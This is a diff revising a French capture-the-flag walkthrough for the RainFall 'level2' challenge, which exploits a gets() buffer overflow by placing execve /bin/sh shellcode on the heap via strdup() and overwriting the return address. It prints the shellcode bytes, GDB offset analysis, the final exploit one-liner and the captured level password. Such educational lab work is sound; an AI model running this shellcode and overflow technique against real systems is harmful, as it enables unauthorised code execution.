@@ -1,10 +1,10 @@
-# Niveau 2 : Dépassement de tampon avec exécution sur le tas
+# Level2 : Buffer Overflow avec Exécution sur le Tas (Heap)
 
-## Vue d'ensemble du défi
+## Aperçu du Défi
 
-Dans le niveau 2, nous rencontrons un programme qui lit l'entrée utilisateur dans un tampon, puis la copie sur le tas à l'aide de `strdup()`. Le programme inclut un mécanisme de protection qui vérifie si l'adresse de retour a été modifiée pour pointer vers la pile, mais il ne bloque pas la redirection vers le tas.
+Dans le `level2`, nous rencontrons un programme qui lit l'entrée utilisateur dans un *buffer*, puis la copie sur le tas (*heap*) en utilisant `strdup()`. Le programme inclut un mécanisme de protection qui vérifie si l'adresse de retour a été modifiée pour pointer vers la pile (*stack*), mais n'empêche pas la redirection vers le tas.
 
-## Analyse du code source
+## Analyse du Code Source
 
 Le code source de ce niveau révèle la vulnérabilité :
 
@@ -28,24 +28,24 @@ void p(void)
   uint32_t return_address;
   char buffer[76];
 
-  // Vider le tampon stdout
+  // Vider le buffer stdout
   fflush(stdout);
 
-  // Lire l'entrée dans le tampon (vulnérable au dépassement de tampon)
+  // Lire l'entrée dans le buffer (vulnérable au buffer overflow)
   gets(buffer);
 
   // Vérifier si l'adresse de retour commence par 0xb0000000 (plage d'adresses de la pile)
-  // Ceci est une protection contre les exploits typiques de dépassement de tampon sur la pile
+  // C'est une protection contre les exploits typiques de buffer overflow sur la pile
   if ((return_address & 0xb0000000) == 0xb0000000) {
     printf("(%p)\n", return_address);
     /* Le processus se termine ici */
     _exit(1);
   }
 
-  // Répéter l'entrée utilisateur
+  // Renvoyer l'entrée à l'utilisateur
   puts(buffer);
 
-  // Dupliquer le tampon (alloue de la mémoire sur le tas)
+  // Dupliquer le buffer (alloue de la mémoire sur le tas)
   strdup(buffer);
 
   return;
@@ -54,18 +54,18 @@ void p(void)
 
 Observations clés :
 
-1. Le programme utilise `gets()`, qui est vulnérable au dépassement de tampon.
-2. Il y a une vérification de protection contre les exploits basés sur la pile (adresses commençant par 0xb).
+1. Le programme utilise `gets()`, qui est vulnérable au *buffer overflow*.
+2. Il y a une vérification de protection contre les *exploits* basés sur la pile (adresses commençant par 0xb).
 3. La fonction `strdup()` copie notre entrée sur le tas.
 
-## La vulnérabilité
+## La Vulnérabilité
 
-Ce programme présente deux vulnérabilités principales :
+Ce programme présente deux vulnérabilités clés :
 
-1. **Dépassement de tampon** : L'utilisation de `gets()` permet d'écrire au-delà des 76 octets du tampon.
-2. **Redirection d'exploit** : Bien qu'il y ait une vérification contre les exploits basés sur la pile, nous pouvons rediriger l'exécution vers le tas, qui a des adresses commençant généralement par 0x8.
+1.  **Buffer Overflow** : L'utilisation de `gets()` nous permet d'écrire au-delà du *buffer* de 76 octets.
+2.  **Redirection de l'Exploit** : Même s'il y a une vérification contre les *exploits* basés sur la pile, nous pouvons rediriger l'exécution vers le tas, dont les adresses commencent généralement par 0x8.
 
-## Contournement de la protection
+## Organisation de la Mémoire et Contournement de la Protection
 
 La vérification de protection dans ce programme cible les adresses de la pile :
 
@@ -73,30 +73,30 @@ La vérification de protection dans ce programme cible les adresses de la pile :
 if ((return_address & 0xb0000000) == 0xb0000000)
 ```
 
-Cela vérifie si les 4 bits les plus élevés de l'adresse sont 0xb (1011 en binaire). C'est une plage courante pour les adresses de la pile dans les systèmes Linux 32 bits, mais les adresses du tas commencent généralement par 0x8, ce qui nous permet de contourner cette vérification.
+Cela vérifie si les 4 bits les plus significatifs de l'adresse sont 0xb (1011 en binaire). C'est une plage courante pour les adresses de la pile dans les systèmes Linux 32 bits, mais les adresses du tas commencent généralement par 0x8, ce qui nous permet de contourner cette vérification.
 
-## Stratégie d'exploitation
+## Stratégie d'Exploitation
 
-Notre approche utilise la mémoire du tas allouée par `strdup()` :
+Notre approche tire parti de la mémoire du tas allouée par `strdup()` :
 
-1. Créer un code d'exploitation avec le shellcode (un code qui nous donne un shell) au début.
-2. Laisser `strdup()` copier notre shellcode sur le tas.
-3. Déborder le tampon pour écraser l'adresse de retour avec l'adresse du tas.
-4. Lorsque la fonction retourne, l'exécution saute à notre shellcode sur le tas.
+1. Créer un *payload* avec un *shellcode* (un code qui nous donne un *shell*) au début.
+2. Laisser `strdup()` copier notre *shellcode* sur le tas.
+3. Déborder le *buffer* pour écraser l'adresse de retour avec l'adresse du tas.
+4. Lorsque la fonction retourne, l'exécution saute vers notre *shellcode* sur le tas.
 
-## Trouver l'adresse du tas
+## Trouver l'Adresse du Tas
 
 Nous avons utilisé GDB pour trouver où `strdup()` place notre entrée :
 
 ```bash
 level2@RainFall:~$ gdb -q ./level2
 (gdb) disas p
-# Recherche de l'instruction ret
+# Recherche de l'instruction ret dans le désassemblage
 0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
 0x0804853d <+105>:   leave
 0x0804853e <+106>:   ret
 
-(gdb) break *0x0804853e  # Point d'arrêt à l'instruction ret
+(gdb) break *0x0804853e  # Placer un point d'arrêt (breakpoint) à l'instruction ret
 (gdb) run
 # Entrer une chaîne de test
 test
@@ -108,54 +108,66 @@ Breakpoint 1, 0x0804853e in p ()
 
 Nous avons découvert que `strdup()` place systématiquement notre entrée à l'adresse `0x804a008` sur le tas.
 
-## Création de l'exploit
+## Création de l'Exploit
 
-Avec ces informations, nous avons conçu un exploit avec :
+Avec cette information, nous avons conçu un *exploit* contenant :
 
-1. Un shellcode pour lancer un shell.
-2. Un remplissage pour remplir le tampon.
-3. Une valeur pour écraser l'EBP sauvegardé.
-4. L'adresse du tas (0x804a008) pour écraser l'adresse de retour.
+1. Un *shellcode* pour lancer un *shell*.
+2. Du *padding* (remplissage) pour remplir le *buffer*.
+3. Une valeur pour écraser les 4 octets du cadre de pile (*stack frame*) (peut être arbitraire).
+4. L'adresse du tas (`0x804a008`) pour écraser l'adresse de retour.
 
-### Récupération du shellcode
+### Récupération du Shellcode
 
-Pour exécuter `/bin/sh`, nous avions besoin d'un shellcode qui effectue l'appel système `execve`. Au lieu d'écrire le shellcode nous-mêmes, nous avons récupéré un shellcode pré-écrit depuis [Shell-Storm](http://shell-storm.org/shellcode/), un référentiel bien connu pour les shellcodes.
+Pour exécuter `/bin/sh`, nous avions besoin d'un *shellcode* qui effectue l'appel système `execve`. Au lieu d'écrire le *shellcode* nous-mêmes, nous avons récupéré un *shellcode* pré-écrit depuis [Shell-Storm](http://shell-storm.org/shellcode/), un dépôt bien connu de *shellcodes*.
 
-Nous avons recherché "Linux/x86 - execve /bin/sh" sur Shell-Storm et trouvé [un shellcode compact de 21 octets](https://shell-storm.org/shellcode/files/shellcode-575.html) :
+Nous avons cherché "Linux/x86 - execve /bin/sh" sur Shell-Storm et trouvé [un *shellcode* compact de 21 octets](https://shell-storm.org/shellcode/files/shellcode-575.html) :
+
 ```assembly
 \x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
 ```
-Ce shellcode lance un shell en invoquant l'appel système `execve` avec `/bin/sh` comme argument.
 
-### Pourquoi gérer l'EBP
+Ce *shellcode* lance un *shell* en invoquant l'appel système `execve` avec `/bin/sh` comme argument.
 
-Dans le niveau 2, l'EBP sauvegardé (Extended Base Pointer) est situé entre le tampon et l'adresse de retour. Cela diffère du niveau 1, où le tampon est directement suivi par l'adresse de retour. Nous n'avons pas besoin de savoir ce qu'est l'EBP dans le contexte de ce niveau , juste qu'il occupe 4 octets qui doivent être pris en compte dans notre exploit.
+### Trouver les Décalages Exacts pour le Débordement
 
-#### Différence clé entre le niveau 1 et le niveau 2
+Pour vérifier la disposition exacte du *buffer* et les décalages (*offsets*) requis, nous avons créé un motif de test avec différentes séquences de caractères :
 
-- **Niveau 1** :
+```bash
+level2@RainFall:~$ python -c 'print("A"*76 + "B"*4 + "C"*4 + "D"*4)' > /tmp/test2
+level2@RainFall:~$ gdb -q ./level2 
 
-  ```assembly
-  0x08048489 <+9>:     lea    0x10(%esp),%eax  # Le tampon est alloué par rapport à ESP
-  ```
+(gdb) run < /tmp/test2
+Breakpoint 1, 0x0804853e in p () # Point d'arrêt à l'instruction de retour
+(gdb) x/s $eax
+0x804a008:       'A' <repeats 64 times>, "CCCCAAAAAAAABBBBCCCCDDDD"
+(gdb) info frame
+Stack level 0, frame at 0xbffff630:
+ eip = 0x804853e in p; saved eip 0x43434343
+ called by frame at 0xbffff634
+ Arglist at 0x42424242, args: 
+ Locals at 0x42424242, Previous frame's sp is 0xbffff630
+ Saved registers:
+  eip at 0xbffff62c
+```
 
-  Dans le niveau 1, le tampon est alloué par rapport à ESP (Stack Pointer), et il n'y a pas d'EBP sauvegardé entre le tampon et l'adresse de retour.
+Cette session GDB confirme plusieurs informations critiques :
 
-- **Niveau 2** :
-  ```assembly
-  0x080484e7 <+19>:    lea    -0x4c(%ebp),%eax  # Le tampon est alloué par rapport à EBP
-  ```
-  Dans le niveau 2, le tampon est alloué par rapport à EBP, et l'EBP sauvegardé occupe 4 octets entre le tampon et l'adresse de retour.
+1. L'adresse de retour sauvegardée (EIP) est `0x43434343`, ce qui correspond à "CCCC" en ASCII.
+2. Les données du cadre de pile (*stack frame*) sont affichées comme `0x42424242`, ce qui correspond à "BBBB" en ASCII.
+3. L'adresse du tas où notre entrée est copiée est systématiquement `0x804a008`.
+4. Le *buffer overflow* se produit exactement comme prévu :
+    - Les 76 premiers octets remplissent le *buffer*.
+    - Les 4 octets suivants écrasent les données du cadre de pile.
+    - Les 4 octets suivants écrasent l'adresse de retour.
 
-#### Ajustement de l'exploit
+Cela confirme la structure exacte nécessaire pour notre *exploit* :
+- *Shellcode* au début (sera dupliqué à `0x804a008`).
+- *Padding* pour remplir le *buffer* (55 octets après notre *shellcode* de 21 octets).
+- 4 octets pour écraser les données du cadre de pile (peut être n'importe quelle valeur, ici "BBBB").
+- 4 octets pour écraser l'adresse de retour avec `0x804a008` (adresse du tas).
 
-Pour concevoir l'exploit pour le niveau 2, nous devons :
-
-1. Remplir le tampon de 76 octets.
-2. Écraser les 4 octets de l'EBP sauvegardé avec une valeur quelconque (par exemple, "BBBB").
-3. Écraser l'adresse de retour avec l'adresse du tas où notre shellcode est stocké. Afin que notre shellcode soit exécuté quand la fonction retourne.
-
-## L'exploit final
+## L'Exploit Final
 
 ```bash
 (python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A"*55 + "BBBB" + "\x08\xa0\x04\x08"'; cat) | ./level2
@@ -163,24 +175,25 @@ Pour concevoir l'exploit pour le niveau 2, nous devons :
 
 Décomposition :
 
-- Shellcode (21 octets) : `\x6a\x0b\x58...` - Lance /bin/sh et se termine proprement.
-- Remplissage (55 octets) : `"A"*55` - Remplit le reste du tampon de 76 octets.
-- Écrasement de l'EBP (4 octets) : `"BBBB"` - Valeur arbitraire pour l'EBP sauvegardé.
-- Adresse de retour (4 octets) : `\x08\xa0\x04\x08` - 0x804a008 au format little-endian.
-- `cat` - Garde stdin ouvert pour l'interaction avec le shell. Consultez le walkthrough du niveau 1 pour plus de détails.
+- *Shellcode* (21 octets) : `\x6a\x0b\x58...` - Lance `/bin/sh`.
+- *Padding* (55 octets) : `"A"*55` - Remplit le reste du *buffer* de 76 octets.
+- Écrasement de EBP (4 octets) : `"BBBB"` - Valeur arbitraire pour les données du cadre de pile (qui incluent EBP sauvegardé).
+- Adresse de retour (4 octets) : `\x08\xa0\x04\x08` - `0x804a008` au format *little-endian*. Consultez le *walkthrough* du `level1` pour plus de détails sur le *little-endian*.
+- `cat` - Maintient `stdin` ouvert pour l'interaction avec le *shell*. Consultez le *walkthrough* du `level1` pour plus de détails.
 
-## Obtenir le mot de passe
 
-Après avoir exécuté l'exploit, nous obtenons un shell et pouvons lire le mot de passe :
+## Obtenir le Mot de Passe
+
+Après avoir exécuté l'*exploit*, nous obtenons un *shell* et pouvons lire le mot de passe :
 
 ```bash
 cat /home/user/level3/.pass
 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
 ```
 
-## Passer au niveau suivant
+## Passer au Niveau Suivant
 
-Avec le mot de passe obtenu, nous pouvons maintenant passer au niveau 3 :
+Avec le mot de passe obtenu, nous pouvons maintenant passer au `level3` :
 
 ```bash
 level2@RainFall:~$ su level3
@@ -188,12 +201,9 @@ Password: 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
 level3@RainFall:~$
 ```
 
-## Leçons retenues
+## Leçons Apprises
 
-1. **La protection de la pile n'est pas suffisante** : Les vérifications simples sur les adresses de retour peuvent être contournées en utilisant d'autres régions de mémoire comme le tas.
-
-2. **Comprendre la disposition de la mémoire est crucial** : Savoir comment la mémoire est organisée (pile vs tas) permet des techniques d'exploitation créatives.
-
-3. **Fonctions dangereuses** : `gets()` reste dangereux, quelles que soient les vérifications supplémentaires, car il permet une entrée illimitée.
-
-4. **Intégrité du cadre de pile** : Lors de la redirection de l'exécution, gérer correctement le cadre de pile (y compris l'EBP) est important pour des exploits fiables.
+1.  **La Protection de la Pile n'est Pas Suffisante** : Des vérifications simples sur les adresses de retour peuvent être contournées en utilisant des régions mémoire alternatives comme le tas.
+2.  **La Compréhension de l'Organisation Mémoire est Cruciale** : Savoir comment la mémoire est organisée (pile vs tas) permet des techniques d'*exploitation* créatives.
+3.  **Fonctions Dangereuses** : `gets()` reste dangereuse indépendamment des vérifications supplémentaires car elle permet une entrée illimitée.
+4.  **Intégrité du Cadre de Pile** : Lors de la redirection de l'exécution, gérer correctement le cadre de pile (*stack frame*, y compris EBP) est important pour des *exploits* fiables.
